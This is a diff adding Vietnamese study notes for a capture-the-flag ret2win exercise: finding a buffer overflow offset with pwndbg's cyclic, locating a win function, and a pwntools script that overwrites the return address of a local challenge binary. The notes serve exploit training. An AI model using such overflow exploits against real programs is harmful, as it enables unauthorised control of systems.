@@ -48,5 +48,41 @@ checksec ./chall
 checksec ./chall64
 
 
-# 
+# Cách tìm offset
+## Tạo pattern
+pwndbg> cyclic <length>
+
+
+# Khi chương trình crash, kiểm tra giá trị EIP/RIP:
+info registers eip  # 32-bit
+info registers rip  # 64-bit
+
+
+# Tìm offset từ giá trị EIP/RIP:
+cyclic -l <giá_trị_eip/rip>
+
+
+# Tìm địa chỉ hàm win
+objdump -d chall64 | grep win
+p & win
+
+
+# Viết script (solve1.py)
+from pwn import *
+
+p = process('./chall_ret2win')
+
+offset = 40                    #Độ dài offset
+win_addr = 0x401156            #Địa chỉ hàm win
+
+payload = b'A' * offset        #Tạo input gây BOF
+payload += p64(win_addr)       #Ghi đè địa chỉ hàm win lên return address
+
+p.sendline(payload)
+p.interactive()
+
+
+# Chạy script
+python3 solve1.py
+
 #---------------------------------------------------------------------
